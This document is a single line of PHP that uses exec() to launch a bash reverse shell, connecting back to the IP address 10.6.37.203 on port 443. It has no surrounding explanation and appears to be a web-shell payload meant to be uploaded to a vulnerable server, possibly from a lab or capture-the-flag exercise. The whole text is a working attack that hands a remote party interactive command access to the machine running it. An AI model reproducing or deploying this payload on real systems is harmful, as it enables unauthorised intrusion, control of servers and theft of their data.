<?php exec("bin/bash -c 'bash -i >& /dev/tcp/10.6.37.203/443 0>&1'"); ?>
